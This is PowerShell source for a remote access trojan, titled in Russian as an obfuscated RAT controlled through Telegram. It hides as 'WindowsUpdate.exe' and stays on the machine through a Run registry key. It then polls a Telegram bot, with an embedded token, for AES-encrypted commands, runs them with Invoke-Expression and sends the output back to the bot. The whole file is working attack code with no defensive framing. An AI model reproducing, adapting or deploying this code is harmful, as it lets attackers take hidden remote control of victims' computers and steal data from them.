# Обфусцированный RAT для Telegram
function Decrypt-String($encrypted) {
    $bytes = [System.Convert]::FromBase64String($encrypted)
    $iv = $bytes[0..15]
    $data = $bytes[16..$bytes.Length]
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = [System.Text.Encoding]::UTF8.GetBytes("16byte_secret_key!")
    $aes.IV = $iv
    $decryptor = $aes.CreateDecryptor()
    [System.Text.Encoding]::UTF8.GetString($decryptor.TransformFinalBlock($data, 0, $data.Length))
}

function Encrypt-String($plaintext) {
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = [System.Text.Encoding]::UTF8.GetBytes("16byte_secret_key!")
    $aes.GenerateIV()
    $encryptor = $aes.CreateEncryptor()
    $encrypted = $encryptor.TransformFinalBlock([System.Text.Encoding]::UTF8.GetBytes($plaintext), 0, $plaintext.Length)
    [System.Convert]::ToBase64String($aes.IV + $encrypted)
}

# Установка персистентности
$ratPath = "$env:TEMP\WindowsUpdate.exe"
if (!(Test-Path $ratPath)) {
    Copy-Item $MyInvocation.MyCommand.Path $ratPath
    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d $ratPath /f
}

# Основной цикл RAT
while ($true) {
    try {
        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot<8254717589:AAF5I5BW5xaL-wHqQhm6n2HX9nfaOLkcgxU>/getUpdates" -TimeoutSec 30
        foreach ($update in $updates.result) {
            $message = Decrypt-String $update.message.text
            if ($message -like "/cmd*") {
                $command = $message.Substring(5)
                $output = Invoke-Expression $command 2>&1 | Out-String
                $encryptedOutput = Encrypt-String $output
                Invoke-RestMethod -Uri "https://api.telegram.org/bot<8254717589:AAF5I5BW5xaL-wHqQhm6n2HX9nfaOLkcgxU>/sendMessage" -Method Post -Body @{
                    chat_id = "8367594494>"
                    text = $encryptedOutput
                } | Out-Null
            }
        }
    }
    catch {
        Start-Sleep -Seconds 60
    }
    Start-Sleep -Seconds 10
}